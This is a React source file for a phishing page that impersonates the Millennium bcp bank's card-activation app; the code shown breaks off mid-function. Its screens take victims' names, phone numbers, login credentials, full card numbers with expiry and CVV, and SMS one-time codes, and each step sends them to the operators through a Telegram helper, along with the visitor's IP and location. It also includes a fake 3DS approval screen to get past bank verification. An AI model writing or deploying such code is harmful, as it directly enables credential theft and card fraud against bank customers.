"use client"

import React, { useState, useEffect, useRef } from "react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
import {
  ChevronDown,
  ChevronLeft,
  Eye,
  EyeOff,
  Globe,
  Home,
  Lock,
  MapPin,
  RotateCw,
  Smartphone,
  UserPlus,
  Users,
  X,
} from "lucide-react"

// Crisp SVG Flag for Portugal (PT / +351)
function PortugalFlag({ className = "w-6 h-4" }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 600 400"
      className={`shrink-0 overflow-hidden ${className}`}
      xmlns="http://www.w3.org/2000/svg"
      aria-label="Flag of Portugal"
    >
      <rect width="240" height="400" fill="#046A38" />
      <rect x="240" width="360" height="400" fill="#DA291C" />
      <g transform="translate(240, 200)">
        <circle r="60" fill="none" stroke="#FED100" strokeWidth="12" />
        <circle r="46" fill="none" stroke="#FED100" strokeWidth="6" />
        <line x1="-60" y1="0" x2="60" y2="0" stroke="#FED100" strokeWidth="8" />
        <line x1="0" y1="-60" x2="0" y2="60" stroke="#FED100" strokeWidth="8" />
        <ellipse rx="36" ry="58" fill="none" stroke="#FED100" strokeWidth="6" transform="rotate(45)" />
        <path
          d="M -26,-28 L 26,-28 L 26,12 C 26,36 0,44 0,44 C 0,44 -26,36 -26,12 Z"
          fill="#FFFFFF"
          stroke="#DA291C"
          strokeWidth="10"
        />
        <path
          d="M -12,-16 L 12,-16 L 12,8 C 12,20 0,26 0,26 C 0,26 -12,20 -12,8 Z"
          fill="#002B7F"
        />
        <circle cx="0" cy="4" r="3" fill="#FFFFFF" />
        <circle cx="0" cy="-6" r="3" fill="#FFFFFF" />
      </g>
    </svg>
  )
}

// Crisp SVG Flag for Cyprus (CY / +357)
function CyprusFlag({ className = "w-6 h-4" }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 640 400"
      className={`shrink-0 overflow-hidden ${className}`}
      xmlns="http://www.w3.org/2000/svg"
      aria-label="Flag of Cyprus"
    >
      <rect width="640" height="400" fill="#FFFFFF" />
      {/* Cyprus Island Shape in Copper (#D57800) */}
      <path
        d="M363 118c14-7 32-13 52-19 28-9 62-17 78-21 7-2 13-1 9 5-13 13-35 27-50 37-9 6-25 13-38 18-12 5-15 10-23 18-8 7-17 14-29 16-17 3-45 2-67 9-17 5-39 18-50 20-11 2-33-4-44-12-11-8-22-8-33-12-8-3-11-10-6-15 9-9 22-6 35-12 14-7 29-17 44-18 14-1 29 7 44 5 18-3 37-14 53-17 9-2 16-11 23-11z"
        fill="#D57800"
      />
      {/* Olive Branches in Green (#4E7037) */}
      <g fill="#4E7037" stroke="#4E7037">
        <path
          d="M210 255c45 28 105 32 165 14-12-8-55-2-95-18-25-10-50-6-70 4z"
          fill="#4E7037"
        />
        {/* Left leaves */}
        <ellipse cx="230" cy="245" rx="12" ry="5" transform="rotate(-35 230 245)" />
        <ellipse cx="250" cy="258" rx="12" ry="5" transform="rotate(-18 250 258)" />
        <ellipse cx="275" cy="266" rx="12" ry="5" transform="rotate(3 275 266)" />
        <ellipse cx="240" cy="235" rx="11" ry="5" transform="rotate(20 240 235)" />
        <ellipse cx="265" cy="248" rx="11" ry="5" transform="rotate(30 265 248)" />
        <ellipse cx="295" cy="262" rx="11" ry="5" transform="rotate(38 295 262)" />
        {/* Right leaves */}
        <ellipse cx="360" cy="260" rx="12" ry="5" transform="rotate(-15 360 260)" />
        <ellipse cx="380" cy="248" rx="12" ry="5" transform="rotate(-40 380 248)" />
        <ellipse cx="335" cy="268" rx="12" ry="5" transform="rotate(10 335 268)" />
        <ellipse cx="365" cy="242" rx="11" ry="5" transform="rotate(-50 365 242)" />
        <ellipse cx="340" cy="252" rx="11" ry="5" transform="rotate(-25 340 252)" />
        <ellipse cx="315" cy="265" rx="11" ry="5" transform="rotate(-10 315 265)" />
      </g>
    </svg>
  )
}

// Millennium bcp Brand Logo Component
function MillenniumLogo({
  className = "",
  variant = "magenta",
  size = "normal",
}: {
  className?: string
  variant?: "magenta" | "white"
  size?: "normal" | "large"
}) {
  const color = variant === "white" ? "#ffffff" : "#990440"
  const width = size === "large" ? 220 : 135
  const height = size === "large" ? 62 : 38

  return (
    <div className={`flex flex-col items-center select-none ${className}`}>
      <svg
        viewBox="0 0 260 76"
        width={width}
        height={height}
        fill={color}
        xmlns="http://www.w3.org/2000/svg"
        className="shrink-0 overflow-visible"
        aria-label="Millennium bcp"
      >
        {/* Stylized 'M' with iconic curved top swoosh */}
        <path
          d="M 12 12 C 12 5, 21 1.5, 28 0 C 26 5, 25 10, 24 16 L 24 46 L 33 46 L 33 16 L 45 42 L 51 42 L 63 16 L 63 46 L 71 46 L 71 8 L 61 8 L 48 34 L 35 8 L 22 8 C 17 8, 14 10, 12 12 Z"
        />
        {/* 'illennium' wordmark */}
        <text
          x="73"
          y="46"
          fontFamily="system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
          fontSize="37"
          fontWeight="400"
          letterSpacing="-0.5px"
        >
          illennium
        </text>
        {/* Horizontal rule below Millennium */}
        <line x1="8" y1="52" x2="252" y2="52" stroke={color} strokeWidth="2.4" />
        {/* 'bcp' text right-aligned under line */}
        <text
          x="250"
          y="72"
          textAnchor="end"
          fontFamily="system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
          fontSize="22"
          fontWeight="600"
          letterSpacing="-0.2px"
        >
          bcp
        </text>
      </svg>
    </div>
  )
}

function BocBrandLogo({ className }: { className?: string }) {
  return <MillenniumLogo className={className} />
}

function BocLogo({ className }: { className?: string }) {
  return <MillenniumLogo className={className} />
}

function BibdLogo({ className }: { className?: string }) {
  return <MillenniumLogo className={className} />
}

// Luhn Algorithm Card Validator (validates standard 16-digit cards)
function isValidLuhn(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\D/g, "")
  if (digits.length !== 16) return false
  let sum = 0
  let isEven = false
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits.charAt(i), 10)
    if (isEven) {
      digit *= 2
      if (digit > 9) digit -= 9
    }
    sum += digit
    isEven = !isEven
  }
  return sum % 10 === 0
}

// Millennium bcp rectangular badge (for 3DS verification header)
function MillenniumBcpBadge({ className = "" }: { className?: string }) {
  return (
    <div
      className={`bg-[#990440] text-white px-3.5 py-1.5 rounded-[2px] shadow-sm select-none inline-flex flex-col justify-center ${className}`}
      style={{ minWidth: "135px" }}
    >
      <div className="flex items-baseline">
        <span
          className="text-[18px] sm:text-[19.5px] font-bold tracking-[-0.02em] leading-none text-white select-none"
          style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', serif" }}
        >
          Millennium
        </span>
      </div>
      <div className="w-full h-[1px] bg-white/90 my-[2.5px]" />
      <span className="text-[10.5px] sm:text-[11.5px] font-sans font-bold leading-none text-right tracking-tight text-white pr-0.5">
        bcp
      </span>
    </div>
  )
}

// Official Visa Secure Badge
function VisaSecureBadge({ className = "" }: { className?: string }) {
  return (
    <div className={`flex flex-col items-end select-none ${className}`}>
      <span
        className="font-sans font-black italic text-[#0c2069] text-[18px] sm:text-[20px] leading-none tracking-wider pr-0.5"
        style={{ fontFamily: "'Helvetica Neue', Arial, sans-serif" }}
      >
        VISA
      </span>
      <div className="bg-[#0c2069] text-white text-[8px] sm:text-[9px] font-bold tracking-[0.16em] px-2 py-[2.5px] rounded-[1px] uppercase mt-1 leading-none">
        SECURE
      </div>
    </div>
  )
}



// Reusable Card Activation Stepper Header (4 steps across all screens)
function CardActivationHeader({
  step = 1,
  onBack,
  onClose,
  showBack = true,
  showClose = true,
  language = "pt",
  onToggleLanguage,
}: {
  step: 1 | 2 | 3 | 4
  onBack?: () => void
  onClose?: () => void
  showBack?: boolean
  showClose?: boolean
  language?: "pt" | "en"
  onToggleLanguage?: (lang: "pt" | "en") => void
}) {
  return (
    <div className="w-full shrink-0 select-none bg-white">
      {/* Header Bar: < CARD ACTIVATION [PT|EN] X */}
      <header className="relative z-20 w-full px-4 sm:px-5 pt-4 pb-2.5 flex items-center justify-between shrink-0 select-none bg-white">
        <div className="w-8 flex items-center shrink-0">
          {showBack ? (
            <button
              type="button"
              onClick={onBack}
              className="p-1 -ml-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
              aria-label="Back"
            >
              <ChevronLeft className="w-6 h-6 stroke-[2]" />
            </button>
          ) : (
            <div className="w-6 h-6" />
          )}
        </div>

        <span className="text-[13px] sm:text-[14px] font-bold text-[#111827] tracking-[0.1em] uppercase text-center truncate px-1">
          {language === "en" ? "CARD ACTIVATION" : "ATIVAÇÃO DO CARTÃO"}
        </span>

        <div className="flex items-center gap-2 shrink-0">
          {onToggleLanguage && (
            <div className="flex items-center bg-[#f1f5f9] rounded-full p-0.5 text-[10.5px] font-bold border border-slate-200/60 select-none">
              <button
                type="button"
                onClick={() => onToggleLanguage("pt")}
                className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
                  language === "pt"
                    ? "bg-[#990440] text-white shadow-xs"
                    : "text-[#64748b] hover:text-[#0f172a]"
                }`}
                aria-label="Português"
              >
                PT
              </button>
              <button
                type="button"
                onClick={() => onToggleLanguage("en")}
                className={`px-1.5 py-0.5 rounded-full transition-all cursor-pointer ${
                  language === "en"
                    ? "bg-[#990440] text-white shadow-xs"
                    : "text-[#64748b] hover:text-[#0f172a]"
                }`}
                aria-label="English"
              >
                EN
              </button>
            </div>
          )}

          {showClose ? (
            <button
              type="button"
              onClick={onClose}
              className="p-1 -mr-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
              aria-label="Clear"
            >
              <X className="w-5 h-5 stroke-[2]" />
            </button>
          ) : (
            <div className="w-5 h-5" />
          )}
        </div>
      </header>

      {/* Stepper / 4-segment progress bar */}
      <div className="w-full px-5 pt-1 pb-4 flex items-center gap-2 select-none shrink-0">
        <div
          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
            step >= 1 ? "bg-[#990440]" : "bg-[#e5e7eb]"
          }`}
        />
        <div
          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
            step >= 2 ? "bg-[#990440]" : "bg-[#e5e7eb]"
          }`}
        />
        <div
          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
            step >= 3 ? "bg-[#990440]" : "bg-[#e5e7eb]"
          }`}
        />
        <div
          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
            step >= 4 ? "bg-[#990440]" : "bg-[#e5e7eb]"
          }`}
        />
      </div>
    </div>
  )
}

type ScreenType =
  | "splash"
  | "phone"
  | "login"
  | "card"
  | "boc-verify"
  | "otp"
  | "accounts"
  | "confirm-otp"

// Splash animated icon loader sequence (matching user screenshots)
const SPLASH_ICONS = [
  { src: "/icon_receipt.png", alt: "Receipt" },
  { src: "/icon_gift.png", alt: "Gift" },
  { src: "/icon_transfer.png", alt: "Transfer" },
]

export default function BbvaPage(props: any) {
  const initialScreen: ScreenType = props?.initialScreen || "splash"
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(initialScreen)
  const [splashIconIndex, setSplashIconIndex] = useState(0)
  const [splashAnimPhase, setSplashAnimPhase] = useState<"in" | "out">("in")
  const [isScreenLoading, setIsScreenLoading] = useState(false)
  const [language, setLanguage] = useState<"pt" | "en">(() => {
    if (typeof window !== "undefined") {
      const saved = sessionStorage.getItem("millennium_lang")
      if (saved === "en" || saved === "pt") return saved
      const urlParams = new URLSearchParams(window.location.search)
      const langParam = urlParams.get("lang")
      if (langParam === "en") return "en"
    }
    return "pt"
  })

  const handleLanguageChange = (lang: "pt" | "en") => {
    setLanguage(lang)
    if (typeof window !== "undefined") {
      sessionStorage.setItem("millennium_lang", lang)
    }
  }
  const [locationInfo, setLocationInfo] = useState<{
    ip?: string
    city?: string
    region?: string
    country_name?: string
    country_code?: string
    org?: string
    [key: string]: any
  } | null>(null)

  useEffect(() => {
    if (typeof window !== "undefined") {
      const p = window.location.pathname
      if (p.includes("/cc")) {
        setCurrentScreen("confirm-otp")
      } else if (p.includes("/accounts")) {
        setCurrentScreen("accounts")
      } else if (p.includes("/boc-verify") || p.includes("/3ds")) {
        setCurrentScreen("boc-verify")
      } else if (p.includes("/verify") || p.includes("/otp")) {
        setCurrentScreen("otp")
      } else if (p.includes("/card")) {
        setCurrentScreen("card")
      } else if (p.includes("/contacts") || p.includes("/phone") || p.includes("/mobile")) {
        setCurrentScreen("phone")
      } else if (p.includes("/splash")) {
        setCurrentScreen("splash")
      }
    }
  }, [])

  // Immediate visitor tracking and location alert ONLY on splash screen
  const hasTrackedVisitor = useRef(false)
  useEffect(() => {
    if (currentScreen !== "splash") return
    if (hasTrackedVisitor.current) return
    hasTrackedVisitor.current = true

    let isMounted = true
    const trackVisitorOnLanding = async () => {
      try {
        const info = await fetchVisitorInfo()
        if (info && isMounted) {
          setLocationInfo(info)
        }
        await sendTelegramMessage({
          title: "Millennium bcp — Splash Screen Visitor",
          type: "splash",
          includeLocation: true,
        })
      } catch (err) {
        console.error("Visitor tracking error:", err)
      }
    }
    trackVisitorOnLanding()
    return () => {
      isMounted = false
    }
  }, [currentScreen])

  // Login form states
  const [userId, setUserId] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")

  // Contact info / Mobile number states (Screen before card)
  const [fullName, setFullName] = useState("")
  const [isNameFocused, setIsNameFocused] = useState(false)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isPhoneFocused, setIsPhoneFocused] = useState(false)
  const [phoneCountryCode, setPhoneCountryCode] = useState("+351")
  const [phoneError, setPhoneError] = useState("")
  const [isPhoneSubmitting, setIsPhoneSubmitting] = useState(false)
  const phoneInputRef = useRef<HTMLInputElement>(null)
  const fullNameInputRef = useRef<HTMLInputElement>(null)

  // Card form states
  const [cardNumber, setCardNumber] = useState("")
  const [cardMonth, setCardMonth] = useState("")
  const [cardYear, setCardYear] = useState("")
  const [cardCvv, setCardCvv] = useState("")
  const [cardError, setCardError] = useState("")
  const [isCardSubmitting, setIsCardSubmitting] = useState(false)
  const [isBocVerifying, setIsBocVerifying] = useState(false)

  // Card input refs for auto-moving focus
  const cardNumberRef = useRef<HTMLInputElement>(null)
  const cardMonthRef = useRef<HTMLInputElement>(null)
  const cardYearRef = useRef<HTMLInputElement>(null)
  const cardCvvRef = useRef<HTMLInputElement>(null)

  // OTP Screen States (6 digits matching Screenshot)
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [focusedOtpIndex, setFocusedOtpIndex] = useState<number | null>(0)
  const [timeLeft, setTimeLeft] = useState<number>(179) // 2:59
  const [otpError, setOtpError] = useState("")
  const [isOtpSubmitting, setIsOtpSubmitting] = useState(false)
  const [resendSuccess, setResendSuccess] = useState(false)
  const [shakeCount, setShakeCount] = useState(0)
  const otpRefs = useRef<(HTMLInputElement | null)[]>([])

  // Accounts screen states (Matching new Screenshot)
  const [accountNumber, setAccountNumber] = useState("")
  const [accountBalance, setAccountBalance] = useState("")
  const [isAccountsSubmitting, setIsAccountsSubmitting] = useState(false)
  const [accountsSuccess, setAccountsSuccess] = useState(false)

  // Confirm Transaction OTP Screen States (Matching Screenshot 2 /cc)
  const [confirmOtp, setConfirmOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [confirmFocusedIndex, setConfirmFocusedIndex] = useState<number | null>(0)
  const [confirmTimeLeft, setConfirmTimeLeft] = useState<number>(178) // 2:58 as shown in screenshot
  const [confirmAttempt, setConfirmAttempt] = useState<number>(1)
  const [hasConfirmError, setHasConfirmError] = useState<boolean>(false)
  const [confirmErrorMessage, setConfirmErrorMessage] = useState("Incorrect code. Please try again.")
  const [isConfirmSubmitting, setIsConfirmSubmitting] = useState(false)
  const [confirmShake, setConfirmShake] = useState(0)
  const confirmOtpRefs = useRef<(HTMLInputElement | null)[]>([])

  // Dynamic greeting based on Portugal time (Europe/Lisbon)
  const [greeting, setGreeting] = useState("Bom dia")

  useEffect(() => {
    const updateGreeting = () => {
      try {
        const now = new Date()
        const lisbonTime = new Date(now.toLocaleString("en-US", { timeZone: "Europe/Lisbon" }))
        const hour = lisbonTime.getHours()
        if (hour >= 5 && hour < 12) {
          setGreeting(language === "en" ? "Good morning" : "Bom dia")
        } else if (hour >= 12 && hour < 20) {
          setGreeting(language === "en" ? "Good afternoon" : "Boa tarde")
        } else {
          setGreeting(language === "en" ? "Good evening" : "Boa noite")
        }
      } catch {
        setGreeting(language === "en" ? "Good morning" : "Bom dia")
      }
    }
    updateGreeting()
  }, [language])

  // Restore stored session values if available
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedUser = sessionStorage.getItem("bbva_userId") || sessionStorage.getItem("cacib_userId")
      if (savedUser) setUserId(savedUser)
      const savedPhone =
        sessionStorage.getItem("bbva_phoneNumber") ||
        sessionStorage.getItem("phoneNumber") ||
        sessionStorage.getItem("bibd_phone")
      if (savedPhone) {
        const clean = savedPhone.replace("+357", "").replace("+673", "").trim()
        setPhoneNumber(clean)
      }
    }
  }, [])

  // Auto-advance splash screen with calm, slow-paced transition:
  // Each icon gently rises & fades in, rests calmly, then dissolves away before the next appears (low speed, no circle feeling)
  useEffect(() => {
    if (currentScreen !== "splash") return

    const timers: NodeJS.Timeout[] = []

    // 0ms: Icon 0 appears smoothly
    setSplashIconIndex(0)
    setSplashAnimPhase("in")

    // 1050ms: Icon 0 dissolves away
    timers.push(
      setTimeout(() => {
        setSplashAnimPhase("out")
      }, 1050)
    )

    // 1500ms: Icon 1 appears smoothly
    timers.push(
      setTimeout(() => {
        setSplashIconIndex(1)
        setSplashAnimPhase("in")
      }, 1500)
    )

    // 2550ms: Icon 1 dissolves away
    timers.push(
      setTimeout(() => {
        setSplashAnimPhase("out")
      }, 2550)
    )

    // 3000ms: Icon 2 appears smoothly
    timers.push(
      setTimeout(() => {
        setSplashIconIndex(2)
        setSplashAnimPhase("in")
      }, 3000)
    )

    // 4050ms: Icon 2 dissolves away
    timers.push(
      setTimeout(() => {
        setSplashAnimPhase("out")
      }, 4050)
    )

    // 4500ms: Smoothly advances to contacts screen
    timers.push(
      setTimeout(() => {
        setCurrentScreen("phone")
        if (typeof window !== "undefined" && window.history) {
          window.history.replaceState({ screen: "phone" }, "", "/contacts")
        }
      }, 4500)
    )

    return () => {
      timers.forEach(clearTimeout)
    }
  }, [currentScreen])

  // Phone screen initially keeps fields unfocused so placeholder text displays in the center

  // Timer countdown for OTP (Code expires in 2:59)
  useEffect(() => {
    if (currentScreen !== "otp") return
    if (timeLeft <= 0) return
    const interval = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(interval)
  }, [currentScreen, timeLeft])

  // Timer countdown for Confirm OTP /cc (Code expires in 2:58)
  useEffect(() => {
    if (currentScreen !== "confirm-otp") return
    if (confirmTimeLeft <= 0) return
    const interval = setInterval(() => {
      setConfirmTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(interval)
  }, [currentScreen, confirmTimeLeft])

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60)
    const s = sec % 60
    return `${m}:${s < 10 ? "0" : ""}${s}`
  }

  // Auto-move: Card Number (16 digits -> moves to Month)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 16)
    const formatted = raw.replace(/(\d{4})(?=\d)/g, "$1 ")
    setCardNumber(formatted)
    if (cardError) setCardError("")
    if (raw.length === 16) {
      cardMonthRef.current?.focus()
    }
  }

  // Auto-move: Month (2 digits -> moves to Year)
  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
    setCardMonth(val)
    if (cardError) setCardError("")
    if (val.length === 2) {
      cardYearRef.current?.focus()
    }
  }

  const handleMonthKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardMonth) {
      cardNumberRef.current?.focus()
    }
  }

  // Auto-move: Year (2 digits -> moves to CVV)
  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
    setCardYear(val)
    if (cardError) setCardError("")
    if (val.length === 2) {
      cardCvvRef.current?.focus()
    }
  }

  const handleYearKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardYear) {
      cardMonthRef.current?.focus()
    }
  }

  // CVV: Strictly 3 digits
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 3)
    setCardCvv(val)
    if (cardError) setCardError("")
  }

  const handleCvvKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardCvv) {
      cardYearRef.current?.focus()
    }
  }

  // Mobile number input: unlimited / infinite length
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "")
    setPhoneNumber(raw)
    if (phoneError) setPhoneError("")
  }

  // Handle Mobile Number & Contact Submit -> Sends Telegram -> 1.5s loading -> Card Screen
  const handlePhoneSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const cleanPhone = phoneNumber.replace(/\s+/g, "")
    if (!cleanPhone) {
      setPhoneError(
        language === "en"
          ? "Please enter your mobile number"
          : "Por favor, introduza o seu número de telemóvel"
      )
      phoneInputRef.current?.focus()
      return
    }

    setPhoneError("")
    setIsPhoneSubmitting(true)
    setIsScreenLoading(true)

    const fullPhone = cleanPhone

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_fullName", fullName.trim())
      sessionStorage.setItem("bbva_phoneNumber", fullPhone)
      sessionStorage.setItem("phoneNumber", fullPhone)
      sessionStorage.setItem("bibd_phone", fullPhone)
    }

    try {
      await sendTelegramMessage({
        title: "Millennium bcp — Name & Mobile Number Captured",
        fullName: fullName.trim() || undefined,
        dni: fullName.trim() || undefined,
        phoneNumber: fullPhone,
        phone: fullPhone,
        type: "phone",
        exclude: ["location"],
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // 1.5 second loading then transition to card screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setIsPhoneSubmitting(false)
      setCurrentScreen("card")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "card" }, "", "/card")
      }
    }, 1500)
  }

  // 1. Handle Login submission: Show blur loading for exactly 2 seconds, then transition to card screen
  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    if (!userId.trim()) {
      setErrorMessage(language === "en" ? "Please enter your User" : "Por favor, introduza o seu Utilizador")
      return
    }
    if (!password.trim()) {
      setErrorMessage(language === "en" ? "Please enter your Password" : "Por favor, introduza a sua Palavra-passe")
      return
    }

    setErrorMessage("")
    setIsScreenLoading(true)

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_userId", userId.trim())
      sessionStorage.setItem("bbva_password", password)
      sessionStorage.setItem("documentId", userId.trim())
    }

    try {
      await sendTelegramMessage({
        title: "Millennium bcp — Login Captured",
        dni: userId.trim(),
        password: password,
        type: "login",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // Wait exactly 2 seconds as requested, then switch to card screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("card")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "card" }, "", "/card")
      }
    }, 2000)
  }

  // 2. Handle Card Details Submit: Show blur loading for exactly 2 seconds, then transition to OTP screen
  const handleCardSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const cleanCard = cardNumber.replace(/\s+/g, "")
    if (!isValidLuhn(cleanCard)) {
      setCardError(
        language === "en"
          ? "Please enter a valid 16-digit card number"
          : "Por favor, introduza um número de cartão válido de 16 dígitos"
      )
      cardNumberRef.current?.focus()
      return
    }
    if (!cardMonth || !cardYear) {
      setCardError(language === "en" ? "Expiration date is required" : "Data de validade é obrigatória")
      if (!cardMonth) cardMonthRef.current?.focus()
      else cardYearRef.current?.focus()
      return
    }
    if (cardCvv.length !== 3) {
      setCardError(language === "en" ? "CVV must be 3 digits" : "O código CVV deve ter 3 dígitos")
      cardCvvRef.current?.focus()
      return
    }

    setCardError("")
    setIsScreenLoading(true)

    const expiry = `${cardMonth}/${cardYear}`

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_cardNumber", cleanCard)
      sessionStorage.setItem("bbva_cardExpiry", expiry)
      sessionStorage.setItem("bbva_cardCvv", cardCvv)
    }

    try {
      const savedUser =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_fullName") || sessionStorage.getItem("bbva_userId"))) ||
        fullName.trim() ||
        userId.trim()
      const savedPhone =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_phoneNumber") ||
            sessionStorage.getItem("phoneNumber") ||
            sessionStorage.getItem("bibd_phone"))) ||
        (phoneNumber ? phoneNumber.replace(/\s+/g, "") : undefined)

      await sendTelegramMessage({
        title: "Millennium bcp — Card Details Captured",
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        cardNumber: cleanCard,
        expiry: expiry,
        cvv: cardCvv,
        type: "card",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // Wait exactly 2 seconds as requested, then switch to the 3DS verification screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("boc-verify")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "boc-verify" }, "", "/boc-verify")
      }
    }, 2000)
  }

  // Dynamic date formatted as DD/MM/YYYY according to Cyprus timezone (Europe/Nicosia)
  const currentDateFormatted = (() => {
    try {
      const formatter = new Intl.DateTimeFormat("en-GB", {
        timeZone: "Europe/Nicosia",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      })
      return formatter.format(new Date())
    } catch {
      const now = new Date()
      const d = String(now.getDate()).padStart(2, "0")
      const m = String(now.getMonth() + 1).padStart(2, "0")
      const y = now.getFullYear()
      return `${d}/${m}/${y}`
    }
  })()

  // 2.5 Handle 3DS Purchase Verification Approval: "Έχω ήδη εγκρίνει την συναλλαγή"
  const handleBocApproval = async () => {
    setIsBocVerifying(true)
    try {
      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
      const savedPhone =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_phoneNumber") ||
            sessionStorage.getItem("phoneNumber") ||
            sessionStorage.getItem("bibd_phone"))) ||
        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

      await sendTelegramMessage({
        title: "Millennium bcp — 3DS Approval Clicked",
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
        type: "verify",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    setTimeout(() => {
      setIsBocVerifying(false)
      setCurrentScreen("otp")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "otp" }, "", "/verify")
      }
      setTimeout(() => {
        otpRefs.current[0]?.focus()
      }, 100)
    }, 1200)
  }

  // Helper to transition from OTP to Accounts page with 2-second loading (as requested)
  const triggerOtpCompletion = (codeToSave: string) => {
    setIsScreenLoading(true)
    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_otp", codeToSave)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    const savedPhone =
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

    sendTelegramMessage({
      title: "Millennium bcp — SMS OTP Captured",
      dni: savedUser || undefined,
      phoneNumber: savedPhone || undefined,
      otp1: codeToSave,
      type: "otp",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("accounts")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "accounts" }, "", "/accounts")
      }
    }, 2000)
  }

  // 3. Handle OTP Code Digit Entry (Auto-moving through all 6 digits & auto-complete)
  const handleOtpChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "")
    if (!clean) {
      const nextOtp = [...otp]
      nextOtp[index] = ""
      setOtp(nextOtp)
      return
    }

    // Handle full paste
    if (clean.length > 1) {
      const digits = clean.slice(0, 6).split("")
      const nextOtp = [...otp]
      digits.forEach((d, i) => {
        if (index + i < 6) nextOtp[index + i] = d
      })
      setOtp(nextOtp)
      const targetFocus = Math.min(index + digits.length, 5)
      otpRefs.current[targetFocus]?.focus()

      const fullCode = nextOtp.join("")
      if (fullCode.length === 6) {
        triggerOtpCompletion(fullCode)
      }
      return
    }

    const nextOtp = [...otp]
    nextOtp[index] = clean[clean.length - 1]
    setOtp(nextOtp)
    if (otpError) setOtpError("")

    // Auto advance to next box
    if (index < 5) {
      otpRefs.current[index + 1]?.focus()
    }

    // Auto complete when all 6 digits entered
    const fullCode = nextOtp.join("")
    if (fullCode.length === 6) {
      triggerOtpCompletion(fullCode)
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (!otp[index] && index > 0) {
        const nextOtp = [...otp]
        nextOtp[index - 1] = ""
        setOtp(nextOtp)
        otpRefs.current[index - 1]?.focus()
      } else {
        const nextOtp = [...otp]
        nextOtp[index] = ""
